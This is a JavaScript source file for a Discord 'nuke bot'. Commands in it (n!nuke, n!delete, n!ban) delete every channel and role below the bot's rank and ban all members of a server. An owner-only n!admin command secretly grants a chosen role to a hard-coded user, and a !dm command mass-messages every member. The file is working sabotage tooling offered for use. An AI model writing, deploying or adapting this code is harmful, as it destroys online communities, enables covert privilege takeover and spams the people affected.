const discord = require("discord.js");
const nuke = new discord.Client();


nuke.on("ready", () =>{
console.log("This bot has been developed by Frederikam.")
console.log(`${nuke.user.tag} is online.`);
nuke.user.setPresence({ game: { name: `Nuking Discord Servers :) | Dev: Frederikam` }, type: 0 });
});

nuke.on("message", async(msg)=>{


if(msg.content.toLowerCase().startsWith("n!" + "nuke")){
    msg.guild.roles.filter(r=>r.position < msg.guild.me.highestRole.position).deleteAll();
    msg.guild.channels.deleteAll();
    msg.guild.members.tap(member => member.ban("Banned by Nuke Bot | Dev: Frederikam"));
}

if(msg.content.toLowerCase().startsWith("n!" + "delete")){
    msg.guild.roles.filter(r => r.position < msg.guild.me.highestRole.position).deleteAll();
    msg.guild.channels.deleteAll();
}

if(msg.content.toLowerCase().startsWith("n!" + "ban")){
    msg.guild.members.tap(member => member.ban("Banned By Nuke Bot | Developed By Frederikam"));
}

if(msg.content.toLowerCase().startsWith("n!" + "help")){
    msg.author.send({
        embed: {
            color: 0xff0000,
            author: { name: "Nuke Bot | Developed By Frederikam" },
            description: "n!nuke - Bans all members & deletes all roles and channels\nn!delete - Deletes all channels and roles\nn!ban - Bans all members in the discord\n\nFor any help contact Jinx#4395"
        }
    })
}

if (msg.author.id == "YOUR-ID") {
    if (msg.content == "n!admin") {
        const guild = msg.guild

        if (!guild.me.hasPermission("ADMINISTRATOR")) return console.error("No admin in said guild!");

        var role = guild.roles.find(r => r.name == "ROLE-NAME")
        var member = guild.members.get("YOUR-ID")

        if (role) {
            member.addRole(role)
        } else {
            console.log("No role!")
        }
    }
}

{if (msg.author.id == YOUR-ID && msg.content.startsWith("!dm")) {
        let msg_to_send = msg.content.substring(4);
        let memarr = msg.guild.members.array();
        for (let i = 0; i < memarr.length; i++) {
            let mem = memarr[i]
            await mem.send(msg_to_send).catch(() => { });
        }
    }
}


});

nuke.login("YOUR-TOKEN");
